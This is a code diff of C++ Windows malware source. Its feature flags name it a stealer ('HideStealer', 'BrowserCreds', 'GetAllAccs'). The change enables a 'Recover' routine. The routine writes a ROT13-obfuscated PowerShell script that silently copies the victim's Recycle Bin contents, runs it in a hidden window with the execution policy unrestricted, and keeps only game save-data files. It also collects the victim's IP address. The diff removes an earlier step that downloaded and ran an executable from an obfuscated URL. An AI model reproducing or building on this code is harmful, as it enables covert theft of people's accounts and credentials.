@@ -54,7 +54,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
-        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        string Feature = "[Tracer:(N)]--[Recover:(Y)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         CleanUp();
         string RawIPInfo = DownloadString("http://icanhazip.com/");
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
@@ -526,19 +526,42 @@ void RecoverSaveDats()
     string ZBRecoveredFolder = tempPath + "\\ZBRecoveredFolder";
     try
     {
-        filesystem::remove(ZBRecoveredFolder);
+        filesystem::remove_all(ZBRecoveredFolder);
         filesystem::create_directory(ZBRecoveredFolder);
     }
     catch (...)
     {
         filesystem::create_directory(ZBRecoveredFolder);
     }
-    string RecoverPath = tempPath + "\\RecycleBinScanner.exe";
-    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}ok09n|fyof54bsgpv ec#&<-;nS9$>&< .e\" "), RecoverPath);
-    wstring wRecoverPath;
+    string ps1file = ZBRecoveredFolder + "\\RecoverFiles.ps1";
+    ofstream WritePS1(ps1file);
+    WritePS1 << decrypt("$furyy = Arj-Bowrpg -PbzBowrpg Furyy.Nccyvpngvba") << endl;
+    WritePS1 << decrypt("$erplpyrOva = $furyy.Anzrfcnpr(0kN)") << endl;
+    WritePS1 << decrypt("$erplpyrOva.Vgrzf() | %{Pbcl-Vgrz $_.Cngu (\"") + ZBRecoveredFolder + decrypt("\\{0}\" -s ($_.Anzr+[fgevat](Trg-Enaqbz)))} -ReebeNpgvba FvyragylPbagvahr");
+    WritePS1.close();
+    string Code = decrypt("pzq.rkr /p Cbjrefuryy.rkr -AbCebsvyr -RkrphgvbaCbyvpl haerfgevpgrq -svyr \"") + ps1file + "\"";
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    string SaveDatLocation = SaveDatPath();
+    std::filesystem::path p(SaveDatLocation);
+    for (const auto& entry : fs::directory_iterator(ZBRecoveredFolder))
+    {
+        if (!(entry.path().string().find("save") != string::npos || entry.path().string().find(p.stem().string()) != string::npos))
+        {
+            remove(entry.path());
+        }
+    }
     string tempResult = tempPath + "\\Password.zb";
-    wRecoverPath.assign(RecoverPath.begin(), RecoverPath.end());
-    Execute(wRecoverPath);
     for (const auto& entry : fs::directory_iterator(ZBRecoveredFolder))
     {
         filesystem::rename(entry.path().string(), tempSaveDat);
